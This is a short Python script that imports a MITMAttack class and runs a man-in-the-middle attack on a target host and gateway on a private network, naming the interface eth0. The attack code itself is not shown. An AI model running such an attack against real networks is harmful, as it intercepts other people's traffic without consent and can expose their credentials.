from src.mitm_attack import MITMAttack

# initialize and run the attack
mitm = MITMAttack(target_ip="192.168.1.2", gateway_ip="192.168.1.1", interface="eth0")
mitm.run_attack()
